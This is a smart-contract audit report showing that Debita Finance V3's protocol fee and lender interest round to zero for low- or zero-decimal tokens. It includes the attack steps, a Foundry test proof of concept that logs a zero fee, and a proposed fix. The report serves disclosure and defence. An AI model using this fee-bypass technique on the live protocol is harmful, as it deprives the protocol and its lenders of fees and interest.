# Protocol Fees Can Be Bypassed Using Low/Zero Decimal Tokens

### Summary

Zero/low decimal tokens can be rounded down to 0 during protocol fee and lender interest fee calculation. Borrowers can use such tokens to bypass fees and interest, essentially making free borrowing.

### Root Cause

In competition detail, the protocol stated it supports tokens with the following characteristics:

```text
- any ERC20 that follows exactly the standard (eg. 18/6 decimals)
- Receipt tokens (All the interfaces from "contracts/Non-Fungible-Receipts/..")
- USDC and USDT
- Fee-on-transfer tokens will be used only in `TaxTokensReceipt` contract.
```

The protocol does not explicitly exclude low decimal tokens, which are also valid ERC20 tokens.

There is an issue with the protocol fee being rounded down to 0 at two specific functions:

1. In the [DebitaV3Aggregator::matchOffersV3](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaV3Aggregator.sol#L544), fee is calculated as such
```solidity
uint feeToPay = (amountPerPrinciple[i] * percentage) / 10000;
```
So if the `amountPerPrinciple` is smaller enough, it might round to 0 after dividing 10000. 

2. In the [DebitaV3Loan::calculateInterestToPay-annualInterest](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaV3Loan.sol#L723) and [DebitaV3Loan::calculateInterestToPay-interest](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaV3Loan.sol#L734)
Intial annual interest is calculated as such
```solidity
uint anualInterest = (offer.principleAmount * offer.apr) / 10000;
```
and subsequently, lender interest is calculated as such:
```solidity
uint interest = (anualInterest * activeTime) / 31536000;
```
Similarly, if the `principleAmount` is small enough, `annualInterest` and finally interest can also be rounded to 0 and lender wouldn't be able to receive any interest.

These issues wouldn't be economically viable for tokens with high token decimals eg. 18, as the principle amount needed would be extremely small for this to be profitable. However, this issue becomes feasible with low decimal tokens as the principle amount can remain at a reasonable range. For example, even if protocol fee is at `maxFee` which is `80(0.8%)`, borrowers could receive up to 125 zero decimal tokens without paying any protocol fee.

### Internal pre-conditions

The contract needs to use a token with low/zero decimals (e.g., 0-2 decimals) as collateral to be profitable
The principle amount needs to be small enough so that when multiplied by percentage and divided by 10000:

For `DebitaV3Aggregator::matchOffersV3`:

```solidity
amountPerPrinciple * percentage < 10000
```

For `DebitaV3Loan::calculateInterestToPay`: 

```solidity
offer.principalAmount * apr < 10000
```

### External pre-conditions

None - This vulnerability is entirely dependent on internal protocol conditions.

### Attack Path

1. Borrower supplies a low/zero decimal token as collateral
2. Borrower creates a borrow order with a small principle amount ensuring:
```solidity
amountPerPrinciple * percentage < 10000
```
and
```solidity
(offer.principleAmount * offer.apr) / 10000
```
3. When the loan is matched via `DebitaV3Aggregator::matchOffersV3`, the protocol fee is rounded to 0
4. Similarly, when interest is calculated via `DebitaV3Loan::calculateInterestToPay`, annual interest is rounded to 0, borrower bypasses paying interest.
5. As a result, borrower successfully borrows with zero fees and zero interest

### Impact

1. The protocol loses protocol fees and interest payments when low decimal tokens are used as collateral.
2. The borrowers gain by avoiding both protocol fees (in `matchOffersV3`) and annual interest payments (in `calculateInterestToPay`), effectively getting free loans.

### PoC

Add the code below in the `BasicDebitaAggregator.t.sol` test file

1. Deploy a mock token with 0 decimal and create a fee address to keep track of fee received

```solidity
        address feeAddress = makeAddr("fee");

        // deploy a mock token with 0 decimals
        zero = address(new ERC20ZeroDecimal());
        // deal this contract some ZERO token
        deal(zero, address(this), 1000, true);

        // Zero token setup and
        deal(zero, address(this), 1000, false);
        IERC20(zero).approve(address(DBOFactoryContract), 1000e18);
        IERC20(zero).approve(address(DLOFactoryContract), 1000e18);
```

2. Creates Lend order and Borrow order using this token as collateral / principle
```solidity
 address zeroBorrowOrderAddress = DBOFactoryContract.createBorrowOrder(
            oraclesActivated,
            ltvs,
            1000,
            864000, // 10 days
            acceptedPrinciples,
            zero,
            false,
            0,
            oraclesPrinciples,
            ratio,
            address(0x0),
            500 // 500 token
        );

        address zeroLendOrderAddress = DLOFactoryContract.createLendOrder(
            false,
            oraclesActivated,
            false,
            ltvs,
            1000,
            5184000, // 60 days
            86400, // 1 day
            acceptedCollaterals,
            zero,
            oraclesPrinciples,
            ratio,
            address(0x0),
            100 // 100 token
        );

        ZeroBorrowOrder = DBOImplementation(zeroBorrowOrderAddress);
        ZeroLendOrder = DLOImplementation(zeroLendOrderAddress);
```

3. Match lend order and borrow order and check for fee

```solidity
    function test_FeeCanBeRoundToZero() public {
        address[] memory lendOrders = allDynamicData.getDynamicAddressArray(1);
        uint[] memory lendAmountPerOrder = allDynamicData.getDynamicUintArray(
            1
        );
        uint[] memory porcentageOfRatioPerLendOrder = allDynamicData
            .getDynamicUintArray(1);
        address[] memory principles = allDynamicData.getDynamicAddressArray(1);
        uint[] memory indexForPrinciple_BorrowOrder = allDynamicData
            .getDynamicUintArray(1);
        uint[] memory indexForCollateral_LendOrder = allDynamicData
            .getDynamicUintArray(1);
        uint[] memory indexPrinciple_LendOrder = allDynamicData
            .getDynamicUintArray(1);
        indexForPrinciple_BorrowOrder[0] = 0;
        indexForCollateral_LendOrder[0] = 0;
        indexPrinciple_LendOrder[0] = 0;

        lendOrders[0] = address(ZeroLendOrder);
        lendAmountPerOrder[0] = 50;
        porcentageOfRatioPerLendOrder[0] = 10000;
        principles[0] = zero;

        uint256 feeCollectedBefore = IERC20(zero).balanceOf(feeAddress);
        console.log("Fee collected Before:", feeCollectedBefore);

        address loan = DebitaV3AggregatorContract.matchOffersV3(
            lendOrders,
            lendAmountPerOrder,
            porcentageOfRatioPerLendOrder,
            address(ZeroBorrowOrder),
            principles,
            indexForPrinciple_BorrowOrder,
            indexForCollateral_LendOrder,
            indexPrinciple_LendOrder
        );

        uint256 feeCollectedAfter = IERC20(zero).balanceOf(feeAddress);
        console.log("Fee collected After :", feeCollectedAfter);
    }
```

5. Log result
Log result shows `feeAddress` did not receive any fee
```solidity
("Fee collectedBefore:", 0)
("Fee collectedAfter :", 0)
```

### Mitigation

To prevent fee bypass exploits from being economically viable, we could add a minimum decimal requirement:

Add a decimal check in the relevant contracts to ensure only tokens with sufficient decimals are accepted:

```solidity
function validateTokenDecimals(address token) internal view {
    uint8 decimals = IERC20Metadata(token).decimals();
    require(decimals >= 6, "Token decimals must be at least 6");
}
```
Implement this check when tokens are used as collateral

Additionally, update protocol documentation to explicitly state:

```text
Supported tokens:
- ERC20 tokens with a minimum of 6 decimals
- Receipt tokens (All the interfaces from "contracts/Non-Fungible-Receipts/..")
- USDC and USDT
- Fee-on-transfer tokens will be used only in `TaxTokensReceipt` contract
```
